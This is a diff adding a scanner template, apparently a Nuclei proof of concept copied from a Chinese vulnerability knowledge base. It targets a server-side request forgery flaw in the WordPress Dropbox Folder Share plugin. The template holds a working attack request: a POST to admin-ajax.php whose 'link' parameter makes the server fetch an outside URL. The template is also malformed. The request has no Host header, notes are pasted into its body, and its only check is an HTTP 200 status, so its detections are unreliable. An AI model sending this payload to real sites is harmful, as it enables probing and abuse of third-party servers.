@@ -1,0 +1,51 @@
+id: poc-ycf4gg6yli2atskt
+info:
+  name: WordPress Dropbox Folder Share 服务器端请求伪造漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ycf4gg6yli2atskt'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ycf4gg6yli2atskt
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /wp-admin/admin-ajax.php HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    action=getFolderHeaders&link=http://www.baidu.com
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
